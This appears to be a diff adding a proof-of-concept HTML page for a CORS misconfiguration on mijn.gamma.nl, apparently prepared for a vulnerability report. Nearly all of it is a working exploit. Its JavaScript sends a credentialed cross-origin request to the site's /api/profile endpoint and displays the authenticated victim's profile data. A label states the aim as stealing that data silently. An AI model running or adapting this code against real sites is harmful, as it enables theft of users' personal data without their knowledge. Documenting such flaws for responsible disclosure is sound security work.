@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC — mijn.gamma.nl</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        pre { background: #000; padding: 15px; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; }
+        button { background: #00ff00; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; font-size: 14px; }
+        .label { color: #999; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <h2>CORS Misconfiguration PoC — Intergamma / mijn.gamma.nl</h2>
+    <p class="label">Bug: Server reflects arbitrary subdomains of mijn.gamma.nl in ACAO with credentials: true</p>
+    <p class="label">Attack origin: <code>https://watsaxatniod.com.mijn.gamma.nl</code></p>
+    <p class="label">Target: <code>GET https://mijn.gamma.nl/api/profile</code></p>
+    <p class="label">Impact: Authenticated victim's profile data stolen silently in background</p>
+    <br>
+    <button onclick="exploit()">▶ Run Exploit</button>
+    <br><br>
+    <div class="label">Response:</div>
+    <pre id="output">Waiting...</pre>
+    <div class="label">Parsed data:</div>
+    <pre id="parsed">—</pre>
+
+    <script>
+    function exploit() {
+        document.getElementById('output').innerText = 'Sending credentialed cross-origin request...';
+        document.getElementById('parsed').innerText = '—';
+
+        var xhr = new XMLHttpRequest();
+
+        xhr.onreadystatechange = function() {
+            if (this.readyState !== 4) return;
+
+            document.getElementById('output').innerText =
+                'Status: ' + this.status + '\n\n' +
+                'Response Headers:\n' + this.getAllResponseHeaders() + '\n' +
+                'Body:\n' + this.responseText;
+
+            if (this.status === 200) {
+                try {
+                    var data = JSON.parse(this.responseText);
+                    document.getElementById('parsed').innerText = JSON.stringify(data, null, 2);
+                } catch(e) {
+                    document.getElementById('parsed').innerText = this.responseText;
+                }
+            } else {
+                document.getElementById('parsed').innerText =
+                    '[ Request blocked or victim not authenticated ]\n' +
+                    '[ Run with Burp match-and-replace to verify bypass — see report ]';
+            }
+        };
+
+        xhr.open('GET', 'https://mijn.gamma.nl/api/profile', true);
+        xhr.withCredentials = true;
+        xhr.send();
+    }
+    </script>
+</body>
+</html>
